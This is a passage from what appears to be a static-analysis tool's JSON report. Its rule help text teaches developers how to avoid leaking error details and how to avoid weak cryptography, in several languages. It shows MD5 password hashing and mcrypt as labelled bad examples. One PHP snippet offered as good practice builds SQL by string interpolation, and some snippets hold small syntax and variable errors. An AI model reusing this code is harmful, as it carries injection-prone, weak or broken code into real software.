reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure",
                            "id": "sensitive-to-log/43a4c36a3efa937851e850843f072833",
                            "name": "Sensitive Data Leak: Sensitive Data Is Leaked To Log In Login.js:login",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "8",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 8",
                                    "CWE 117",
                                    "CWE 200",
                                    "OWASP 2021 a01-broken-access-control",
                                    "OWASP a01-2021-broken-access-control",
                                    "OWASP a3-sensitive-data-exposure",
                                    "Sensitive Data Leak"
                                ]
                            },
                            "shortDescription": {
                                "text": "Sensitive Data Leak: Sensitive Data is Leaked to Log in Login.js:login"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Usage of a broken cryptographic algorithm was identified."
                            },
                            "help": {
                                "markdown": "Usage of a broken cryptographic algorithm was identified.\n\n# Encryption Vulnerabilities\n\nEncryption powers the modern internet, allowing secure storage of data and transmission of secrets across a network\nin such a way they cannot be inspected or tampered with by a third party. It is important that you use *strong\nencryption* algorithms when securing data in this way, or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power.\n\n## Encryption Algorithms\n\nEncryption algorithms are designed to encode the contents of a string or binary object in such away that an attacker\nwho does not possession the decryption key will not be able to decipher the contents. *Cryptography* - the study of \nencryption algorithms - is a complex field, and new encryption algorithms are invented by mathematicians frequently.\n\nAs computing power gets cheaper, it becomes easier for an attacker to use brute-force to decrypt the contents of \nencrypted data. For this reason, it's important to use modern encryption algorithms in your code, so your secrets\nremain safe.\n\n::::tabs\n\n:::tab[Java]\n\nConsider the following Java function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```java\npublic static String hashPassword(String password) throws java.security.NoSuchAlgorithmException\n{\n   java.security.MessageDigest digest = java.security.MessageDigest.getInstance(\"MD5\");\n   byte[] bytes = md.digest(password.getBytes());\n   \n   return org.apache.commons.codec.binary.Hex.encodeHexString(bytes);\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[C#]\n\nConsider the following C# function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```csharp\n// An example of weak password hash. Don't use MD5 to encrypt passwords!\npublic static string HashPassword(string password)\n{\n    using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())\n    {\n        byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(password);\n        byte[] hashBytes  = md5.ComputeHash(inputBytes);\n\n        // Convert the byte array to hexadecimal string.\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < hashBytes.Length; i++)\n        {\n            sb.Append(hashBytes[i].ToString(\"X2\"));\n        }\n        \n        return sb.ToString();\n    }\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[JavaScript]\n\nConsider the following Node.js function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```javascript\nconst crypto = require('crypto')\n\nfunction encryptPassword(password) {\n  return crypto.createHash('md5').update('password).digest(\"hex\")\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Python]\n\nConsider the following Python function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```python\nimport hashlib\n\ndef encrypt_password(password):\n  return hashlib.md5(password.encode('utf-8')).hexdigest()\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Scala]\n\nConsider the following Scala function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```scala\nimport java.security.MessageDigest\n\ndef encryptPassword(password: String) = {\n    MessageDigest.getInstance(\"MD5\").digest(password.getBytes).map(\"%02X\" format _).mkString\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[Go]\n\nConsider the following Go function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```go\nimport (\n  \"crypto/md5\"\n  \"encoding/hex\"\n)\n\nfunc HashPassword(password string) string {\n   hash := md5.Sum([]byte(password))\n   return hex.EncodeToString(hash[:])\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[PHP]\n\n## Encryption Vulnerabilities in PHP\n\nIn PHP, it's crucial to use modern and secure encryption methods. Relying on outdated or weak encryption functions can expose sensitive data to attackers. Consider the use of the `mcrypt` extension, which has been deprecated since PHP 7.1.0 due to its aging algorithms and its lack of support for modern cryptography:\n\n```php\nfunction encryptData($data, $key) {\n    $ivSize = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);\n    $iv = mcrypt_create_iv($ivSize, MCRYPT_RAND);\n    return mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);\n}\n```\n\nUsing the `mcrypt` functions in modern applications is not recommended. They utilize older algorithms, are not maintained, and might contain vulnerabilities.\n\n## Mitigation\n\n1. **Use Modern Encryption Libraries**: PHP has the `openssl` extension, which provides a rich set of low-level cryptographic operations. It unfortunately does not come with good high-level abstractions for the most common cryptographic needs.\n\n```php\nfunction encryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    $ivlen = openssl_cipher_iv_length($cipher=$cipher);\n    $iv = random_bytes($ivlen);\n    $ciphertext = openssl_encrypt($data, $cipher, $key, $options=0, $iv, $tag);\n    return json_encode([base64_encode($iv), base64_encode($tag), base64_encode($ciphertext)]);\n}\nfunction decryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    [$iv, $tag, $ciphertext] = json_decode($data);\n    return openssl_decrypt(base64_decode($ciphertext), $cipher, $key, $options=0, base64_decode($iv), base64_decode($tag));\n}\n```\n\n2. **Avoid Deprecated Encryption Extensions**: Steer clear of deprecated extensions like `mcrypt`. Instead, use more modern extensions like `openssl`.\n\n3. **Regularly Update and Review**: Cryptography standards evolve over time. Ensure that your encryption methods are updated regularly to align with best 